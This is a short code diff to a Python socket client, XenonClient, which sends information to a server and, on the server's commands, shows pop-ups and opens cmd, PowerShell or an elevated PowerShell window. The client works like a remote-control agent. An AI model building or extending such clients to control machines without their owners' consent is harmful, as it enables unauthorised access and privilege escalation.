@@ -20,22 +20,16 @@ class XenonClient:
                 self.sock.send(json.dumps(info).encode("utf-8"))
                 
                 while True:
-                    raw_data = self.sock.recv(16384).decode("utf-8")
-                    if not raw_data: break
-                    data = json.loads(raw_data)
+                    raw = self.sock.recv(16384).decode("utf-8")
+                    if not raw: break
+                    data = json.loads(raw)
                     cmd = data.get("cmd")
                     
                     if cmd == "msg":
-                        threading.Thread(target=lambda: messagebox.showinfo("Xenon", data.get("val"))).start()
-                    elif cmd == "cmd":
-                        subprocess.Popen("start cmd", shell=True)
-                    elif cmd == "ps":
-                        subprocess.Popen("start powershell", shell=True)
-                    elif cmd == "ps_admin":
-                        subprocess.Popen("powershell Start-Process powershell -Verb runAs", shell=True)
-                    elif cmd == "chat":
-                        # Chat başlatma kodu buraya...
-                        pass
+                        threading.Thread(target=lambda: messagebox.showinfo("XENON", data.get("val"))).start()
+                    elif cmd == "cmd": subprocess.Popen("start cmd", shell=True)
+                    elif cmd == "ps": subprocess.Popen("start powershell", shell=True)
+                    elif cmd == "ps_admin": subprocess.Popen("powershell Start-Process powershell -Verb runAs", shell=True)
             except: time.sleep(5)
 
 if __name__ == "__main__":
